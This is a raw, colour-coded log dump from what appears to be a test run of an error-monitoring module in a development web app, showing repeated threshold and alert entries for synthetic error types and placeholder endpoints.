ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.957770Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.957818Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_22\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_22, /api/endpoint_72\nStatus Codes: 472, 522, 572, 422\nFirst Occurrence: 2025-07-05T15:23:43.684551\nLast Occurrence: 2025-07-05T15:23:43.957764'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.957864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4972'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.957919Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.957967Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_23\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_23, /api/endpoint_73\nStatus Codes: 473, 523, 573, 423\nFirst Occurrence: 2025-07-05T15:23:43.684602\nLast Occurrence: 2025-07-05T15:23:43.957913'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.958014Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4973'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.958063Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.958112Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_24\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_24, /api/endpoint_74\nStatus Codes: 424, 474, 524, 574\nFirst Occurrence: 2025-07-05T15:23:43.684652\nLast Occurrence: 2025-07-05T15:23:43.958058'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.958157Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4974'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.958235Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.958325Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_25\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_25, /api/endpoint_75\nStatus Codes: 425, 475, 525, 575\nFirst Occurrence: 2025-07-05T15:23:43.684701\nLast Occurrence: 2025-07-05T15:23:43.958203'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.958397Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4975'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.958459Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.958512Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_26\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_26, /api/endpoint_76\nStatus Codes: 576, 426, 476, 526\nFirst Occurrence: 2025-07-05T15:23:43.684751\nLast Occurrence: 2025-07-05T15:23:43.958450'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.958561Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4976'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.958614Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.958663Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_27\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_27, /api/endpoint_77\nStatus Codes: 577, 427, 477, 527\nFirst Occurrence: 2025-07-05T15:23:43.684801\nLast Occurrence: 2025-07-05T15:23:43.958607'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.958710Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4977'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.958761Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.958809Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_28\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_28, /api/endpoint_78\nStatus Codes: 528, 578, 428, 478\nFirst Occurrence: 2025-07-05T15:23:43.684850\nLast Occurrence: 2025-07-05T15:23:43.958755'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.958911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4978'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.958984Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.959039Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_29\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_29, /api/endpoint_79\nStatus Codes: 529, 579, 429, 479\nFirst Occurrence: 2025-07-05T15:23:43.684941\nLast Occurrence: 2025-07-05T15:23:43.958974'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.959093Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4979'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.959146Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.959200Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_30\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_30, /api/endpoint_80\nStatus Codes: 480, 530, 580, 430\nFirst Occurrence: 2025-07-05T15:23:43.685022\nLast Occurrence: 2025-07-05T15:23:43.959140'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.959250Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4980'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.959303Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.959353Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_31\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_31, /api/endpoint_81\nStatus Codes: 481, 531, 581, 431\nFirst Occurrence: 2025-07-05T15:23:43.685082\nLast Occurrence: 2025-07-05T15:23:43.959296'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.959399Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4981'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.959450Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.959499Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_32\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_32, /api/endpoint_82\nStatus Codes: 432, 482, 532, 582\nFirst Occurrence: 2025-07-05T15:23:43.685136\nLast Occurrence: 2025-07-05T15:23:43.959444'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.959545Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4982'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.959596Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.959646Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_33\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_33, /api/endpoint_83\nStatus Codes: 433, 483, 533, 583\nFirst Occurrence: 2025-07-05T15:23:43.685188\nLast Occurrence: 2025-07-05T15:23:43.959590'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.959691Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4983'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.959741Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.959787Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_34\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_34, /api/endpoint_84\nStatus Codes: 584, 434, 484, 534\nFirst Occurrence: 2025-07-05T15:23:43.685239\nLast Occurrence: 2025-07-05T15:23:43.959735'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.959832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4984'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
